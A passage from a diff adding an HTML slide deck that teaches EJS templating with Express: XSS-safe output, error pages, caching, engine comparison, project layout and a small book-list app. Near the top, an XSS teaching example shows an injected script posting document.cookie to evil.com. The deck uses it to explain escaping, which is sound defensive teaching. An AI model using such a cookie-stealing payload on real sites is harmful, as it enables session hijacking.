+&lt;div&gt;&lt;%- userComment %&gt;&lt;/div&gt;
+
+&lt;!-- If userComment contains: --&gt;
+&lt;script&gt;
+  fetch('https://evil.com/steal', {
+    method: 'POST',
+    body: document.cookie
+  });
+&lt;/script&gt;
+
+&lt;!-- SAFE: escaped output --&gt;
+&lt;div&gt;&lt;%= userComment %&gt;&lt;/div&gt;</code></pre>
+      </div>
+      <div class="card amber">
+        <h3>Rule of Thumb</h3>
+        <table>
+          <thead><tr><th>Scenario</th><th>Tag</th></tr></thead>
+          <tbody>
+            <tr><td>User-supplied text</td><td><code>&lt;%= %&gt;</code> always</td></tr>
+            <tr><td>Including partials</td><td><code>&lt;%- %&gt;</code> (required)</td></tr>
+            <tr><td>CMS / Markdown HTML</td><td><code>&lt;%- %&gt;</code> after sanitising</td></tr>
+            <tr><td>JSON in script tag</td><td><code>JSON.stringify()</code></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+    <div>
+      <div class="card green" style="margin-bottom:.4em;">
+        <h3>Sanitisation for Rich Content</h3>
+        <pre><code class="language-javascript">const createDOMPurify = require('dompurify');
+const { JSDOM } = require('jsdom');
+const window = new JSDOM('').window;
+const DOMPurify = createDOMPurify(window);
+
+// In route handler
+const clean = DOMPurify.sanitize(
+  userHtml,
+  { ALLOWED_TAGS: ['b','i','p','a','ul','li'],
+    ALLOWED_ATTR: ['href'] }
+);
+res.render('post', { content: clean });</code></pre>
+        <pre><code class="language-html">&lt;!-- Template — safe after sanitisation --&gt;
+&lt;article&gt;&lt;%- content %&gt;&lt;/article&gt;</code></pre>
+      </div>
+      <div class="card purple">
+        <h3>Embedding Data in JS Safely</h3>
+        <pre><code class="language-html">&lt;script&gt;
+  // SAFE — JSON.stringify escapes
+  // angle brackets in strings
+  const data = &lt;%- JSON.stringify(data) %&gt;;
+&lt;/script&gt;</code></pre>
+        <p>Avoids string interpolation XSS in inline scripts.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 14 — ERROR HANDLING & DEBUGGING -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">13</span><h2>Error Handling &amp; Debugging</h2></div>
+  <div class="cols cols-2">
+    <div>
+      <div class="card red" style="margin-bottom:.4em;">
+        <h3>Common Template Errors</h3>
+        <table>
+          <thead><tr><th>Error</th><th>Cause</th></tr></thead>
+          <tbody>
+            <tr><td><code>x is not defined</code></td><td>Variable not passed to <code>res.render()</code></td></tr>
+            <tr><td><code>Cannot read property of undefined</code></td><td>Accessing nested property on null</td></tr>
+            <tr><td><code>Could not find include</code></td><td>Wrong path in <code>include()</code></td></tr>
+            <tr><td><code>Unexpected token</code></td><td>Syntax error in scriptlet JS</td></tr>
+            <tr><td><code>SyntaxError: missing )</code></td><td>Unclosed tag or mismatched braces</td></tr>
+          </tbody>
+        </table>
+      </div>
+      <div class="card amber">
+        <h3>Defensive Template Coding</h3>
+        <pre><code class="language-html">&lt;!-- Use defaults to avoid crashes --&gt;
+&lt;%= typeof title !== 'undefined'
+    ? title : 'Default Title' %&gt;
+
+&lt;!-- Optional chaining --&gt;
+&lt;%= user?.profile?.avatar ?? '/img/default.png' %&gt;
+
+&lt;!-- locals object (Express) --&gt;
+&lt;%= locals.title || 'Fallback' %&gt;</code></pre>
+      </div>
+    </div>
+    <div>
+      <div class="card green" style="margin-bottom:.4em;">
+        <h3>Express Error Page</h3>
+        <pre><code class="language-javascript">// Error-handling middleware
+app.use((err, req, res, next) =&gt; {
+  console.error(err.stack);
+  res.status(err.status || 500);
+  res.render('error', {
+    message: err.message,
+    stack: app.get('env') === 'development'
+      ? err.stack : ''
+  });
+});</code></pre>
+        <pre><code class="language-html">&lt;!-- views/error.ejs --&gt;
+&lt;h1&gt;&lt;%= message %&gt;&lt;/h1&gt;
+&lt;% if (stack) { %&gt;
+  &lt;pre&gt;&lt;%= stack %&gt;&lt;/pre&gt;
+&lt;% } %&gt;</code></pre>
+      </div>
+      <div class="card blue">
+        <h3>Debugging Tips</h3>
+        <ul>
+          <li>Set <code>DEBUG=ejs:* node app.js</code> for verbose logging</li>
+          <li>Check <code>err.message</code> &mdash; EJS reports line numbers</li>
+          <li>Use <code>&lt;%# %&gt;</code> comments to isolate sections</li>
+          <li>Temporarily add <code>&lt;pre&gt;&lt;%= JSON.stringify(locals, null, 2) %&gt;&lt;/pre&gt;</code> to dump all data</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 15 — PERFORMANCE & CACHING -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">14</span><h2>Performance &amp; Caching</h2></div>
+  <div class="cols cols-2">
+    <div>
+      <div class="card amber" style="margin-bottom:.4em;">
+        <h3>How EJS Compiles Templates</h3>
+        <svg class="diagram" viewBox="0 0 440 100" style="max-width:420px;">
+          <rect x="0" y="20" width="100" height="45" rx="5" fill="none" stroke="var(--amber)" stroke-width="1.5"/>
+          <text x="50" y="47" text-anchor="middle" fill="var(--text)" font-size="11" font-family="JetBrains Mono">.ejs file</text>
+          <line x1="100" y1="42" x2="140" y2="42" stroke="var(--muted)" stroke-width="1.5" marker-end="url(#arr)"/>
+          <rect x="140" y="20" width="100" height="45" rx="5" fill="none" stroke="var(--green)" stroke-width="1.5"/>
+          <text x="190" y="47" text-anchor="middle" fill="var(--text)" font-size="11" font-family="JetBrains Mono">JS function</text>
+          <line x1="240" y1="42" x2="280" y2="42" stroke="var(--muted)" stroke-width="1.5" marker-end="url(#arr)"/>
+          <rect x="280" y="20" width="100" height="45" rx="5" fill="none" stroke="var(--blue)" stroke-width="1.5"/>
+          <text x="330" y="47" text-anchor="middle" fill="var(--text)" font-size="11" font-family="JetBrains Mono">HTML string</text>
+          <text x="50" y="85" text-anchor="middle" fill="var(--muted)" font-size="9" font-family="DM Sans">parse</text>
+          <text x="190" y="85" text-anchor="middle" fill="var(--muted)" font-size="9" font-family="DM Sans">compile (cached)</text>
+          <text x="330" y="85" text-anchor="middle" fill="var(--muted)" font-size="9" font-family="DM Sans">execute</text>
+          <defs><marker id="arr" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="var(--muted)"/></marker></defs>
+        </svg>
+        <p>Parsing is the expensive step. Once compiled, the JS function is reused. The <code>cache</code> option stores compiled functions in memory.</p>
+      </div>
+      <div class="card green">
+        <h3>Express View Cache</h3>
+        <pre><code class="language-javascript">// Auto-enabled in production
+app.set('view cache', true);
+
+// Or via NODE_ENV
+// NODE_ENV=production node app.js
+// Express enables view cache automatically
+// when NODE_ENV === 'production'</code></pre>
+        <p>In dev, templates are re-read and re-compiled on every request (useful for live editing). In production, they compile once.</p>
+      </div>
+    </div>
+    <div>
+      <div class="card purple" style="margin-bottom:.4em;">
+        <h3>EJS cache Option</h3>
+        <pre><code class="language-javascript">// Standalone EJS usage
+ejs.renderFile('tpl.ejs', data, {
+  cache: true,       // enable caching
+  filename: 'tpl'    // cache key
+});
+
+// Precompile for distribution
+const fn = ejs.compile(
+  templateString,
+  { client: true }   // browser-safe
+);
+// fn(data) =&gt; HTML string</code></pre>
+      </div>
+      <div class="card blue">
+        <h3>Performance Tips</h3>
+        <ul>
+          <li><span class="a">Always</span> enable view cache in production</li>
+          <li>Keep partials small &mdash; each include is a function call</li>
+          <li>Avoid deeply nested includes (3+ levels)</li>
+          <li>Move heavy computation to route handlers, not templates</li>
+          <li>Consider precompiling templates at build time for serverless</li>
+          <li>Use <code><%_ _%&gt;</code> whitespace trimming to reduce HTML size</li>
+        </ul>
+      </div>
+      <div class="card red">
+        <h3>Benchmarks (Approximate)</h3>
+        <table>
+          <thead><tr><th>Engine</th><th>Renders/sec</th></tr></thead>
+          <tbody>
+            <tr><td>EJS (cached)</td><td>~28,000</td></tr>
+            <tr><td>Pug (cached)</td><td>~22,000</td></tr>
+            <tr><td>Handlebars (precompiled)</td><td>~35,000</td></tr>
+            <tr><td>Nunjucks (cached)</td><td>~18,000</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 16 — EJS VS OTHER ENGINES -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">15</span><h2>EJS vs Other Template Engines</h2></div>
+  <table>
+    <thead>
+      <tr><th>Feature</th><th>EJS</th><th>Pug</th><th>Handlebars</th><th>Nunjucks</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><span class="a">Syntax</span></td>
+        <td>HTML + JS tags</td>
+        <td>Indentation-based</td>
+        <td>Mustache <code>{{ }}</code></td>
+        <td>Jinja2-style <code>{% %}</code></td>
+      </tr>
+      <tr>
+        <td><span class="a">Learning Curve</span></td>
+        <td><span class="g">Minimal</span></td>
+        <td>Moderate</td>
+        <td>Low</td>
+        <td>Low-Moderate</td>
+      </tr>
+      <tr>
+        <td><span class="a">JS in Templates</span></td>
+        <td>Full JS access</td>
+        <td>Full JS access</td>
+        <td><span class="r">No</span> (logic-less)</td>
+        <td>Limited expressions</td>
+      </tr>
+      <tr>
+        <td><span class="a">Layouts</span></td>
+        <td>Via plugin/includes</td>
+        <td><span class="g">Built-in</span> extends</td>
+        <td>Via partials</td>
+        <td><span class="g">Built-in</span> extends</td>
+      </tr>
+      <tr>
+        <td><span class="a">Auto-Escape</span></td>
+        <td><code>&lt;%= %&gt;</code> escapes</td>
+        <td>Default escaped</td>
+        <td>Default escaped</td>
+        <td>Default escaped</td>
+      </tr>
+      <tr>
+        <td><span class="a">npm Weekly DLs</span></td>
+        <td><span class="g">~4.7M</span></td>
+        <td>~1.5M</td>
+        <td>~3.2M</td>
+        <td>~0.9M</td>
+      </tr>
+      <tr>
+        <td><span class="a">IDE Support</span></td>
+        <td>HTML + JS tooling</td>
+        <td>Needs extension</td>
+        <td>Needs extension</td>
+        <td>Needs extension</td>
+      </tr>
+      <tr>
+        <td><span class="a">Best For</span></td>
+        <td>JS devs, rapid dev</td>
+        <td>Clean markup fans</td>
+        <td>Logic separation</td>
+        <td>Python devs, i18n</td>
+      </tr>
+    </tbody>
+  </table>
+  <div class="card amber" style="margin-top:.3em;">
+    <p><span class="a">When to choose EJS:</span> You want plain HTML, full JavaScript power, zero new syntax, and the largest community. When <span class="r">not</span> to choose EJS: You need built-in template inheritance, logic-less enforcement, or async iteration.</p>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 17 — REAL-WORLD PROJECT STRUCTURE -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">16</span><h2>Real-World Express + EJS Project Structure</h2></div>
+  <div class="cols cols-6040">
+    <div>
+      <div class="card amber">
+        <h3>Directory Layout</h3>
+        <pre><code class="language-text">my-app/
+├── app.js
+├── package.json
+├── .env
+├── config/
+│   └── db.js
+├── routes/
+│   ├── index.js
+│   ├── auth.js
+│   └── products.js
+├── controllers/
+│   ├── authController.js
+│   └── productController.js
+├── models/
+│   ├── User.js
+│   └── Product.js
+├── middleware/
+│   ├── auth.js
+│   └── validate.js
+├── helpers/
+│   └── format.js
+├── views/
+│   ├── layouts/
+│   │   └── main.ejs
+│   ├── partials/
+│   │   ├── head.ejs
+│   │   ├── nav.ejs
+│   │   ├── flash.ejs
+│   │   └── footer.ejs
+│   ├── pages/
+│   │   ├── home.ejs
+│   │   ├── about.ejs
+│   │   └── contact.ejs
+│   ├── auth/
+│   │   ├── login.ejs
+│   │   └── register.ejs
+│   ├── products/
+│   │   ├── index.ejs
+│   │   ├── show.ejs
+│   │   └── edit.ejs
+│   └── error.ejs
+└── public/
+    ├── css/
+    │   └── style.css
+    ├── js/
+    │   └── main.js
+    └── images/</code></pre>
+      </div>
+    </div>
+    <div>
+      <div class="card green" style="margin-bottom:.4em;">
+        <h3>Key Principles</h3>
+        <ul>
+          <li><span class="a">views/layouts/</span> &mdash; HTML shell with <code>&lt;%- body %&gt;</code></li>
+          <li><span class="a">views/partials/</span> &mdash; reusable fragments (nav, footer, flash)</li>
+          <li><span class="a">views/pages/</span> &mdash; static-ish content pages</li>
+          <li><span class="a">views/{resource}/</span> &mdash; CRUD views per model</li>
+          <li><span class="a">helpers/</span> &mdash; pure formatting functions</li>
+          <li><span class="a">public/</span> &mdash; static assets served by Express</li>
+        </ul>
+      </div>
+      <div class="card purple" style="margin-bottom:.4em;">
+        <h3>app.js Setup</h3>
+        <pre><code class="language-javascript">const express = require('express');
+const ejsLayouts = require(
+  'express-ejs-layouts'
+);
+const path = require('path');
+const fmt = require('./helpers/format');
+
+const app = express();
+
+app.set('view engine', 'ejs');
+app.set('views',
+  path.join(__dirname, 'views'));
+app.use(ejsLayouts);
+app.set('layout', 'layouts/main');
+
+// Make helpers available globally
+Object.assign(app.locals, fmt);
+app.locals.siteName = 'My App';
+
+app.use(express.static(
+  path.join(__dirname, 'public')
+));
+app.use(express.urlencoded(
+  { extended: true }
+));</code></pre>
+      </div>
+      <div class="card blue">
+        <h3>Naming Conventions</h3>
+        <p>Use <code>index.ejs</code> for list views, <code>show.ejs</code> for detail, <code>edit.ejs</code> / <code>new.ejs</code> for forms. Mirrors Rails/Express conventions.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 18 — COMPLETE WORKING EXAMPLE -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">17</span><h2>Complete Working Example</h2></div>
+  <div class="cols cols-2">
+    <div>
+      <div class="card amber" style="margin-bottom:.4em;">
+        <h3>app.js &mdash; Full Express + EJS App</h3>
+        <pre><code class="language-javascript">const express = require('express');
+const ejsLayouts = require(
+  'express-ejs-layouts'
+);
+const path = require('path');
+const app = express();
+
+app.set('view engine', 'ejs');
+app.set('views',
+  path.join(__dirname, 'views'));
+app.use(ejsLayouts);
+app.set('layout', 'layouts/main');
+app.use(express.urlencoded(
+  { extended: true }
+));
+app.use(express.static('public'));
+
+app.locals.siteName = 'BookShelf';
+app.locals.year = new Date().getFullYear();
+
+let books = [
+  { id: 1, title: '1984',
+    author: 'Orwell', year: 1949 },
+  { id: 2, title: 'Dune',
+    author: 'Herbert', year: 1965 },
+];
+let nextId = 3;
+
+app.get('/', (req, res) =&gt; {
+  res.render('pages/home', {
+    title: 'Home', books
+  });
+});
+
+app.get('/books/new', (req, res) =&gt; {
+  res.render('books/new', {
+    title: 'Add Book',
+    form: {}, errors: null
+  });
+});
+
+app.post('/books', (req, res) =&gt; {
+  const { title, author, year } = req.body;
+  if (!title || !author) {
+    return res.render('books/new', {
+      title: 'Add Book',
+      form: req.body,
+      errors: { msg: 'All fields required' }
+    });
+  }
+  books.push({
+    id: nextId++, title, author,
+    year: parseInt(year)
+  });
+  res.redirect('/');
+});
+
+app.listen(3000);</code></pre>
+      </div>
+    </div>
+    <div>
+      <div class="card green" style="margin-bottom:.4em;">
+        <h3>views/layouts/main.ejs</h3>
+        <pre><code class="language-html">&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+  &lt;meta charset="UTF-8"&gt;
+  &lt;title&gt;&lt;%= title %&gt; | &lt;%= siteName %&gt;&lt;/title&gt;
+  &lt;link rel="stylesheet" href="/css/style.css"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;%- include('../partials/nav') %&gt;
+  &lt;main class="container"&gt;
+    &lt;%- body %&gt;
+  &lt;/main&gt;
+  &lt;footer&gt;&amp;copy; &lt;%= year %&gt; &lt;%= siteName %&gt;&lt;/footer&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+      </div>
+      <div class="card purple" style="margin-bottom:.4em;">
+        <h3>views/pages/home.ejs</h3>
+        <pre><code class="language-html">&lt;h1&gt;All Books&lt;/h1&gt;
+&lt;a href="/books/new"&gt;+ Add Book&lt;/a&gt;
+&lt;% if (books.length === 0) { %&gt;
+  &lt;p&gt;No books yet.&lt;/p&gt;
+&lt;% } else { %&gt;
+  &lt;table&gt;
+    &lt;tr&gt;&lt;th&gt;Title&lt;/th&gt;&lt;th&gt;Author&lt;/th&gt;&lt;th&gt;Year&lt;/th&gt;&lt;/tr&gt;
+    &lt;% books.forEach(b =&gt; { %&gt;
+      &lt;tr&gt;
+        &lt;td&gt;&lt;%= b.title %&gt;&lt;/td&gt;
+        &lt;td&gt;&lt;%= b.author %&gt;&lt;/td&gt;
+        &lt;td&gt;&lt;%= b.year %&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+    &lt;% }) %&gt;
+  &lt;/table&gt;
+&lt;% } %&gt;</code></pre>
+      </div>
+      <div class="card blue">
+        <h3>views/books/new.ejs</h3>
+        <pre><code class="language-html">&lt;h1&gt;Add a Book&lt;/h1&gt;
+&lt;% if (errors) { %&gt;
+  &lt;p class="error"&gt;&lt;%= errors.msg %&gt;&lt;/p&gt;
+&lt;% } %&gt;
+&lt;form method="POST" action="/books"&gt;
+  &lt;input name="title" placeholder="Title"
+    value="&lt;%= form.title || '' %&gt;"&gt;
+  &lt;input name="author" placeholder="Author"
+    value="&lt;%= form.author || '' %&gt;"&gt;
+  &lt;input name="year" placeholder="Year"
+    value="&lt;%= form.year || '' %&gt;"&gt;
+  &lt;button type="submit"&gt;Save&lt;/button&gt;
+&lt;/form&gt;</code></pre>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SLIDE 19 — SUMMARY & NEXT STEPS -->
+<!-- ============================================================ -->
+<section>
+  <div class="slide-hdr"><span class="tag">18</span><h2>Summary &amp; Next Steps</h2></div>
+  <div class="cols cols-3">
+    <div class="card amber">
+      <h3>Core Takeaways</h3>
+      <ul>
+        <li>EJS = plain HTML + embedded JavaScript</li>
+        <li><code>&lt;%= %&gt;</code> for escaped, <code>&lt;%- %&gt;</code> for raw, <code>&lt;% %&gt;</code> for logic</li>
+        <li>Full JS power &mdash; any expression, any loop, any conditional</li>
+        <li>Includes for partials, plugins for layouts</li>
+        <li>Auto-escaping prevents XSS by default</li>
+      </ul>
+    </div>
+    <div class="card green">
+      <h3>Best Practices</h3>
+      <ul>
+        <li>Always use <code>&lt;%= %&gt;</code> for user data</li>
+        <li>Keep templates thin &mdash; compute in handlers</li>
+        <li>Extract reusable markup into partials</li>
+        <li>Register helpers on <code>app.locals</code></li>
+        <li>Enable view cache in production</li>
+        <li>Use <code>locals.x</code> for optional variables</li>
+      </ul>
+    </div>
+    <div class="card purple">
+      <h3>Next Steps</h3>
+      <ul>
+        <li>Build a CRUD app with Express + EJS</li>
+        <li>Add authentication (Passport.js + EJS forms)</li>
+        <li>Explore <code>express-ejs-layouts</code> for DRY layouts</li>
+        <li>Integrate flash messages (<code>connect-flash</code>)</li>
+        <li>Add client-side validation alongside server-side</li>
+        <li>Try HTMX + EJS for dynamic partial updates</li>
+      </ul>
+    </div>
+  </div>
+  <div class="cols cols-2" style="margin-top:.4em;">
+    <div class="card blue">
+      <h3>Essential Resources</h3>
+      <ul>
+        <li><span class="a">Official Docs:</span> <span class="mono">ejs.co</span></li>
+        <li><span class="a">GitHub:</span> <span class="mono">github.com/mde/ejs</span></li>
+        <li><span class="a">npm:</span> <span class="mono">npmjs.com/package/ejs</span></li>
+        <li><span class="a">Express Guide:</span> <span class="mono">expressjs.com/en/guide/using-template-engines.html</span></li>
+      </ul>
+    </div>
+    <div class="card red">
+      <h3>Key Packages</h3>
+      <table>
+        <thead><tr><th>Package</th><th>Purpose</th></tr></thead>
+        <tbody>
+          <tr><td><code>ejs</code></td><td>Template engine</td></tr>
+          <tr><td><code>express-ejs-layouts</code></td><td>Layout support</td></tr>
+          <tr><td><code>ejs-mate</code></td><td>Alternative layouts</td></tr>
+          <tr><td><code>dompurify</code> + <code>jsdom</code></td><td>HTML sanitisation</td></tr>
+          <tr><td><code>express-validator</code></td><td>Form validation</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</section>
+
+  </div></div>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/reveal.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/plugin/highlight/highlight.min.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.6.1/plugin/highlight/monokai.min.css">
+  <script>
+    Reveal.initialize({
+      hash: true, transition: 'fade', transitionSpeed: 'fast',
+      controls: true, progress: true, center: false,
+      width: 1100, height: 900, margin: 0.01,
+      plugins: [RevealHighlight], highlight: { theme: 'monokai' }
+    });
+  </script>
+</body>
+</html>
